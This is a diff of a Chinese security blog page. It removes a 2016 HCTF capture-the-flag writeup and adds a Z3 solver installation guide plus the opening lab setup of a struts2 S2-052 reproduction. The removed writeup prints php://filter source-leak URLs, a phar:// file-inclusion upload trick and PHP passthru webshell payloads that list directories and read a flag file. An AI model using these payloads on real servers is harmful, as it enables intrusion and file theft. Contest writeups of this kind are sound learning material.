@@ -61,10 +61,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-2016HCTF-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-Windosw环境下安装Z3约束求解器并使用Python-Binding" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/01/01/2016HCTF-writeup/" class="article-date">
-  <time datetime="2016-12-31T16:27:32.000Z" itemprop="datePublished">2017-01-01</time>
+    <a href="/2017/12/18/Windosw环境下安装Z3约束求解器并使用Python-Binding/" class="article-date">
+  <time datetime="2017-12-18T03:23:50.000Z" itemprop="datePublished">2017-12-18</time>
 </a>
     
   </div>
@@ -75,7 +75,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/01/2016HCTF-writeup/">2016HCTF-writeup</a>
+      <a class="article-title" href="/2017/12/18/Windosw环境下安装Z3约束求解器并使用Python-Binding/">Windosw环境下安装Z3约束求解器并使用Python Binding</a>
     </h1>
   
 
@@ -83,42 +83,543 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="写在开头的话"><a href="#写在开头的话" class="headerlink" title="写在开头的话"></a>写在开头的话</h2><p>2016HCTF应该是我第一场比较认真参加的一场CTF了，由于还是个萌新，啥都不懂，这篇文章就是把当时自己做出来的题的做题思路记录一下（其实早该发了，但是因为我懒【捂脸】），让各位dalao见笑了<br>官方wp在这→<a href="http://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">HCTF 2016网络攻防大赛官方Writeup</a><br>膜拜杭电各位大佬</p>
-<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><h3 id="MISC-杂项签到"><a href="#MISC-杂项签到" class="headerlink" title="MISC 杂项签到"></a>MISC 杂项签到</h3><p><a href="http://139.224.54.27/webco1a/+_+.pcapng" target="_blank" rel="noopener">http://139.224.54.27/webco1a/+_+.pcapng</a><br>用wireshark打开流量包，追踪TCP流，发现是一个webshell的流量，看到webshell控制端查看了远程服务器上的两个关键文件：function.py和flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">cat function.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line">__author__ = &apos;Aklis&apos;</span><br><span class="line"></span><br><span class="line">from Crypto import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(encrypted, passphrase):</span><br><span class="line">  IV = encrypted[:16]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  return aes.decrypt(encrypted[16:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(message, passphrase):</span><br><span class="line">  IV = message[:16]</span><br><span class="line">  length = 16</span><br><span class="line">  count = len(message)</span><br><span class="line">  padding = length - (count % length)</span><br><span class="line">  message = message + &apos;\0&apos; * padding</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  return aes.encrypt(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IV = &apos;YUFHJKVWEASDGQDH&apos;</span><br><span class="line"></span><br><span class="line">message = IV + &apos;flag is hctf&#123;xxxxxxxxxxxxxxx&#125;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print len(message)</span><br><span class="line"></span><br><span class="line">example = encrypt(message, &apos;Qq4wdrhhyEWe4qBF&apos;)</span><br><span class="line">print example</span><br><span class="line">example = decrypt(example, &apos;Qq4wdrhhyEWe4qBF&apos;) </span><br><span class="line">print example</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag:</span><br><span class="line">mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==</span><br></pre></td></tr></table></figure>
-<p>flag明显是个base64编码后的字符串，将其解码后再用function.py和decrypt函数解密：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-1.png" alt=""></p>
-<p>运行得到flag：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/ex1-2.png" alt=""></p>
-<hr>
-<h3 id="Web-2099年的flag"><a href="#Web-2099年的flag" class="headerlink" title="Web 2099年的flag"></a>Web 2099年的flag</h3><p>由ios99想到改user-agent，抓包改一下：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/web2009.png" alt=""></p>
-<hr>
-<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><h3 id="Web-RESTFUL"><a href="#Web-RESTFUL" class="headerlink" title="Web RESTFUL"></a>Web RESTFUL</h3><p><a href="http://jinjia.hctf.io/index.php" target="_blank" rel="noopener">http://jinjia.hctf.io/index.php</a><br>打开看到页面下方有提示：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-1.png" alt=""><br>用PUT方法传个参<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-2.png" alt=""><br>因为刚接触web，不懂RESTful是什么，查了一下RESTful，发现是一种web软件架构<br><a href="http://www.ruanyifeng.com/blog/2011/09/restful" target="_blank" rel="noopener">理解RESTful架构</a><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-3.png" alt=""><br>改个包，flag出来了<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/restful-4.png" alt=""></p>
-<h3 id="MISC-gogogo"><a href="#MISC-gogogo" class="headerlink" title="MISC gogogo"></a>MISC gogogo</h3><p>下载下来，发现是个.nes的红白机文件，用FcEuX打开，看到了经典的魂斗罗<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/gogogo-1.png" alt="9"><br>按照 <a href="http://wenku.baidu.com/link?url=1i4slMmKov6LncwLAwa-VmJmAwRwIkgcK-xzls2uOnuJzS7wrsG_mjDdVOVbQzG0Q5p6NmRzcd-vBIbpuWihXEdoiQWs6dsc03aggjzd3Ty" target="_blank" rel="noopener">http://wenku.baidu.com/link?url=1i4slMmKov6LncwLAwa-VmJmAwRwIkgcK-xzls2uOnuJzS7wrsG_mjDdVOVbQzG0Q5p6NmRzcd-vBIbpuWihXEdoiQWs6dsc03aggjzd3Ty</a> 所说的来修改成无限命和不坏金身，打通关就看到了：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/gogogo-2.png" alt=""></p>
-<h3 id="Web-兵者多诡"><a href="#Web-兵者多诡" class="headerlink" title="Web 兵者多诡"></a>Web 兵者多诡</h3><p><a href="http://pics.hctf.io/home.php?key=hduisa123" target="_blank" rel="noopener">http://pics.hctf.io/home.php?key=hduisa123</a><br>参考文章<a href="http://www.hackdig.com/09/hack-26779.htm" target="_blank" rel="noopener">http://www.hackdig.com/09/hack-26779.htm</a><br>看到文件上传页面 猜测是上传漏洞，页面说明只能上传png文件<br>尝试了几次后发现验证方式是对content-type验证，为image/png即可，但是上传后的文件会被重新命名并加上.png后缀。<br>发现允许使用php伪协议：<br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=upload</a><br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=home" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=home</a><br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=function" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=function</a><br><a href="http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=show" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=php://filter/convert.base64-encode/resource=show</a><br>把源码扒下来，base64解码，<br>home.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line">$fp = empty($_GET[&apos;fp&apos;]) ? &apos;fail&apos; : $_GET[&apos;fp&apos;];</span><br><span class="line">if(preg_match(&apos;/\.\./&apos;,$fp))</span><br><span class="line">&#123;</span><br><span class="line">	die(&apos;No No No!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&apos;/rm/i&apos;,$_SERVER[&quot;QUERY_STRING&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">	die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;&lt;/title&gt;</span><br><span class="line">		&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;link href=&quot;css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">		&lt;link href=&quot;css/jumbotron-narrow.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;header clearfix&quot;&gt;</span><br><span class="line">				&lt;nav&gt;</span><br><span class="line">					&lt;ul class=&quot;nav nav-pills pull-right&quot;&gt;</span><br><span class="line">						&lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;home.php?key=hduisa123&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">					&lt;/ul&gt;</span><br><span class="line">				&lt;/nav&gt;</span><br><span class="line">				&lt;h3 class=&quot;text-muted&quot;&gt;pictures&lt;/h3&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">			&lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">				&lt;h1&gt;Pictures Storage&lt;/h1&gt;</span><br><span class="line">				&lt;p class=&quot;lead&quot;&gt;在这里上传您的图片,我们将为您保存&lt;/p&gt;</span><br><span class="line">				&lt;form action=&quot;?fp=upload&quot; method=&quot;POST&quot; id=&quot;form&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">					&lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; class=&quot;btn btn-lg btn-success&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;</span><br><span class="line">					&lt;br&gt;</span><br><span class="line">					&lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-lg btn-success&quot; role=&quot;button&quot; value=&quot;上传图片&quot;&gt;</span><br><span class="line">				&lt;/form&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">	   	&lt;/div&gt; </span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php  </span><br><span class="line">if($fp !== &apos;fail&apos;)</span><br><span class="line">&#123;</span><br><span class="line">	if(!(include($fp.&apos;.php&apos;)))</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;没有此页面&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>upload.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include &apos;function.php&apos;;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]) &amp;&amp; !empty($_FILES[&apos;image&apos;][&apos;tmp_name&apos;]))</span><br><span class="line">&#123;	</span><br><span class="line">	$name = $_FILES[&apos;image&apos;][&apos;tmp_name&apos;];</span><br><span class="line">	$type = $_FILES[&apos;image&apos;][&apos;type&apos;];</span><br><span class="line">	$size = $_FILES[&apos;image&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">	if(!is_uploaded_file($name))</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;图片上传失败,请重新上传&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	if($type !== &apos;image/png&apos;)</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;只能上传PNG图片&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;</span><br><span class="line">	&#125; 	</span><br><span class="line"></span><br><span class="line">	if($size &gt; 10240)</span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;图片大小超过10KB&lt;/div&gt;</span><br><span class="line">		&lt;?php</span><br><span class="line">			exit;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$imagekey = create_imagekey();</span><br><span class="line">	move_uploaded_file($name,&quot;uploads/$imagekey.png&quot;);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;script&gt;location.href=&apos;?fp=show&amp;imagekey=$imagekey&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>show.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$imagekey = $_GET[&apos;imagekey&apos;];</span><br><span class="line">if(empty($imagekey))</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;&lt;script&gt;location.href=&apos;home.php&apos;&lt;/script&gt;&quot;;</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&gt;</span><br><span class="line">	上传成功,&lt;a href=&quot;uploads/&lt;?php echo $imagekey; ?&gt;.png&quot; class=&quot;alert-link&quot;&gt;点此查看&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
-<p>function.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	function create_imagekey()</span><br><span class="line">	&#123;</span><br><span class="line">		return sha1($_SERVER[&apos;REMOTE_ADDR&apos;] . $_SERVER[&apos;HTTP_USER_AGENT&apos;] . time() . mt_rand());</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发现home.php中存在本地文件包含:<code>if(!(include($fp.’.php’)))</code>，fp参数可控制，然后会在文件名后加一个.php进行文件包含，因此我们可以上传我们需要包含的文件。但是直接包含肯定是不行的，需要构造文件名。<br>查询PHP手册发现PHP支持如下的Wrappers：</p>
-<pre><code>file:// — Accessing local filesystem
-http:// — Accessing HTTP(s) URLs
-ftp:// — Accessing FTP(s) URLs
-php:// — Accessing various I/O streams
-zlib:// — Compression Streams
-data:// — Data (RFC 2397)
-glob:// — Find pathnames matching pattern
-phar:// — PHP Archive
-ssh2:// — Secure Shell 2
-rar:// — RAR
-ogg:// — Audio streams
-expect:// — Process Interaction Streams
-</code></pre><p>测试phar://可用，将php文件打包在zip文件中，再构造路径访问。<br>测试发现eval函数被禁用了，因此使用passthru函数执行系统命令。<br>写一个2.php文件，（这里我做题的时候似乎测试到有GET、POST、REQUEST等字段会被过滤，最后看官方wp是可以用GET的，可能是当时我测的出了点问题）打包在zip压缩包中上传，上传时使用burpsuite的截断功能修改content-type。<br>查看当前目录下文件：&lt;?php passthru(‘ls –alh’); ?&gt;<br>上传后访问文件名为24c38706822f22274de3d8faabb5b9601d922d85.png ，访问<br><a href="http://pics.hctf.io/home.php?fp=phar://uploads/24c38706822f22274de3d8faabb5b9601d922d85.png/2" target="_blank" rel="noopener">http://pics.hctf.io/home.php?fp=phar://uploads/24c38706822f22274de3d8faabb5b9601d922d85.png/2</a><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-1.png" alt=""><br>没什么特别的<br>查看工作目录<br><code>&lt;?php passthru(‘pwd’); ?&gt;</code><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-2.png" alt=""><br>查看上层目录<br><code>&lt;?php echo passthru(‘ls /var/www’);?&gt;</code><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-3.png" alt=""><br>有个php文件，查看一下<br><code>&lt;?php echo passthru(‘cat /var/www/Th1s_1s_F1a9.php’);?&gt;</code><br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-4.png" alt=""><br>查看页面源代码<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/%E5%85%B5%E8%80%85%E5%A4%9A%E8%AF%A1-5.png" alt=""></p>
-<h3 id="MISC-教练我想打CTF"><a href="#MISC-教练我想打CTF" class="headerlink" title="MISC 教练我想打CTF"></a>MISC 教练我想打CTF</h3><p>用神器Stegsolve打开，感觉在RGB0位有点问题，猜测是LSB隐写，分析一下<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/教练我想打CTF-2.png" alt=""><br>发现有pk文件头，猜测是个zip压缩包，保存出来，解压，发现提示文件损坏，用winrar自带的工具修复一下，成功了，打开看到一个叫1的文件，010editor打开，发现是个elf文件，继续往下看，成功发现flag<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/2016HCTF-writeup/教练我想打CTF-3.png" alt=""></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次比赛，学到了很多新姿势，也让我认识到自己到底有多菜，dalao们有多强，再次膜拜各位dalao</p>
+        <p>Z3 是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用。<br>Z3 约束求解器是针对 Satisfiability modulo theories Problem 的一种通用求解器。所谓 SMT 问题，在 Z3 环境下是指关于算术、位运算、数组等背景理论的一阶逻辑组合决定性问题。虽然 Z3 功能强大，但是从理论上来说，大部分 SMT 问题的时间复杂度都过高，根本不可能在有限时间内解决。所以千万不要把 Z3 想象得过于万能。<br>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。就 CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。<br>Z3 本身提供一个类似于 Lisp 的内置语言，但是实际使用中，一般使用 Python Binding 操作会比较方便。<br>本文记录了如何在Windows(10 x64)环境下安装Z3并配置使用 Python Binding 。</p>
+<h2 id="0x00-安装前准备"><a href="#0x00-安装前准备" class="headerlink" title="0x00 安装前准备"></a>0x00 安装前准备</h2><p>由于在 Windows 环境下需要用到 Visual Studio Command Prompt 来 build Z3 ，所以需要安装 Visual Studio（或者直接安装 nmake ），我使用的是 Visual Studio 2017 ，直接在开始菜单中找到 VS2017 的文件夹，下拉可以找到 x64 Native Tools Command Prompt for VS 2017</p>
+<h2 id="0x01-安装Z3"><a href="#0x01-安装Z3" class="headerlink" title="0x01 安装Z3"></a>0x01 安装Z3</h2><p>从 github 上 clone Z3</p>
+<pre><code>git clone https://github.com/Z3Prover/z3.git
+</code></pre><p>打开 x64 Native Tools Command Prompt for VS 2017 ，命令行中进入 Z3 文件夹，执行命令：</p>
+<pre><code>python scripts/mk_make.py -x --python
+cd build
+nmake
+</code></pre><p>经过漫长的等待，当看到</p>
+<pre><code>Z3 was successfully built.
+&quot;Z3Py scripts can already be executed in the &apos;build\python&apos; directory.&quot;
+&quot;Z3Py scripts stored in arbitrary directories can be executed if the &apos;build\python&apos; directory is added to the PYTHONPATH environment variable and the &apos;build&apos; directory is added to the PATH environment variable.
+</code></pre><p>就说明安装成功了。</p>
+<h2 id="0x02-将-Z3-路径加入-PYTHONPATH"><a href="#0x02-将-Z3-路径加入-PYTHONPATH" class="headerlink" title="0x02 将 Z3 路径加入 PYTHONPATH"></a>0x02 将 Z3 路径加入 PYTHONPATH</h2><p>我的电脑-&gt;右键-&gt;属性-&gt;高级系统设置-&gt;环境变量，如果没有 PYTHONPATH 需要自行创建，在 python 命令行界面输入：</p>
+<pre><code>import os 
+print(os.sys.path)
+</code></pre><p>可以看到当前的 PYTHONPATH ，将其加入环境变量，并把Z3文件夹下的 build\python 文件夹也加入 PYTHONPATH 。<br>测试一下，在 python 命令行下：</p>
+<pre><code>from z3 import *
+x = Int(&apos;x&apos;)
+y = Int(&apos;y&apos;)
+solve(x &gt; 2, y &lt; 10, x + 2*y == 7)
+</code></pre><p>一般会看到结果：</p>
+<pre><code>[y = 0, x = 7] 
+</code></pre><p>说明配置成功。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<p><a href="https://zhuanlan.zhihu.com/p/30548907" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30548907</a><br><a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">https://github.com/Z3Prover/z3</a></p>
+</blockquote>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://h34dw1nd.github.io/2017/01/01/2016HCTF-writeup/" data-id="cjbc8alqh00000gvkzwppxus8" class="article-share-link">Teilen</a>
+      <a data-url="http://h34dw1nd.github.io/2017/12/18/Windosw环境下安装Z3约束求解器并使用Python-Binding/" data-id="cjbc9l1gm0005ukvkc1o0wr7m" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-struts2-S2-052-复现及分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/07/struts2-S2-052-复现及分析/" class="article-date">
+  <time datetime="2017-09-06T17:09:16.000Z" itemprop="datePublished">2017-09-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/07/struts2-S2-052-复现及分析/">struts2 S2-052 复现及分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前天晚上9点钟apache发布了S2-052的公告，10点多看到了，于是问了一下injector大佬，跟大佬一起研究了一波，感谢大佬带飞。<br>漏洞公告：<a href="http://struts.apache.org/docs/s2-052.html" target="_blank" rel="noopener">http://struts.apache.org/docs/s2-052.html</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>公告上说漏洞出现在struts2的rest插件，使用了XStream实例和XStreamHandler类未经过滤直接调用反序列化函数导致的RCE。</p>
+<p>先定位到XStreamHandler类，找到了反序列化函数toObject，这个函数未做任何过滤直接调用了Xtream类的fromXML函数，可以将XML数据反序列化为Object：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/struts2%20S2-052%20%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/s2_052_1.png" alt=""></p>
+<p>根据调用关系，定位到ContentTypeInterceptor类的intercept函数，可以看到当后端收到请求时，会判断请求类型，如果是XML类型并且content-length大于0，则调用toObject方法将XML数据反序列化：<br><img src="https://raw.githubusercontent.com/h34dw1nd/MyBlogPictures/master/struts2%20S2-052%20%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/s2_052_2.png" alt=""></p>
+<h2 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>安装java8：</p>
+<pre><code>add-apt-repository ppa:webupd8team/java
+apt-get update
+apt-get install oracle-java8-installer
+</code></pre><p>下载tomcat并解压，拷贝到/opt/tomcat下：</p>
+<pre><code>wget http://mirrors.hust.edu.cn/apache/tomcat/tomcat-7/v7.0.81/bin/apache-tomcat-7.0.81.tar.gz
+cp -R apache-tomcat-7.0.81 /opt/tomcat
+</code></pre><p>下载struts2存在漏洞的版本（这里是2.5.12）并解压：</p>
+<pre><code>wget http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip
+unzip struts-2.5.12-apps.zip
+</code></pre><p>将struts2-showcase.war和strusts2-rest-showcase.war拷贝到/opt/tomcat/webapps/下：</p>
+<pre><code>cp struts-2.5.12/apps/struts2-showcase.war /opt/tomcat/webapps/
+cp struts-2.5.12/apps/struts2-rest-showcase.war /opt/tomcat/webapps/
+</code></pre><p>启动tomcat:</p>
+<pre><code>cd /opt/tomcat/bin
+./startup.sh
+</code></pre><p>访问<a href="http://your-ip:8080/struts2-rest-showcase" target="_blank" rel="noopener">http://your-ip:8080/struts2-rest-showcase</a> 即可</p>
